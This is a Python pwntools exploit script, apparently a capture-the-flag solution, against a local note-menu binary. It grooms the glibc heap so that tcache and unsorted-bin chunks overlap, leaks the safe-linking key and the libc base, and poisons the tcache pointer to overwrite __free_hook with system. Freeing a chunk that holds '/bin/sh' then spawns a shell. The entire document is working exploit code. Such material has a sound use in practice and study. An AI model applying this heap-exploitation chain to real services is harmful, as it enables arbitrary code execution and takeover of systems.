#!/usr/bin/env python3
from pwn import *
# overlapping chunk unsortedbins and chunk t-cache
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
p = elf.process()
# context.update(binary=elf, log_level="DEBUG")
# gdb.attach(
#     p,
#     """
#     b *main+81
#     b *main+93
#     b *main+105
#     # x/20gx &notes
#     """,
# )


def create(idx, size, content):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"Page no : ", str(idx).encode())
    p.sendlineafter(b"Name size : ", str(int(size)).encode())
    p.sendlineafter(b"Enter Name : ", content)
    return


def show(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"Page no : ", str(idx).encode())
    leak = p.recvline().strip()
    return leak


def delete(idx):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Page no : ", str(idx).encode())
    return


for i in range(7):
    create(i, 0x100, b"A"*8)

create(7, 0x100, b"B"*8)
create(8, 0x100, b"C"*8)
create(9, 0x10, b"D"*8)

for i in range(7):
    delete(i)

delete(8)
delete(7)
create(6, 0x100, b"E" * 8) # put victim 8 in t-cache
delete(8)

leak = show(0).ljust(8, b'\x00')
key = u64(leak)
log.info("Key XOR heap: " + hex(key))

# malloc size > 0x220 - unsortedbins => update fd to smallbins
create(9, 0x220, b"/bin/sh\x00")    
leak = show(7).ljust(8, b"\x00")
libc.address = u64(leak) - 0x1c4e10
log.info("LIBC base address:   " + hex(libc.address))
log.info("__free_hook address: " + hex(libc.symbols['__free_hook']))
log.info("system address:      " + hex(libc.symbols['system']))

# overwrite getshell
payload = b"A" * 0x108 + p64(0x111) + p64(key ^ libc.symbols['__free_hook'])
# malloc size greater 0x110 => overwrite fd of t-cache
create(1, 0x120, payload) 
create(2, 0x100, b"A"*8)
create(3, 0x100, p64(libc.symbols['system']))
delete(9)

p.interactive()

# https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/
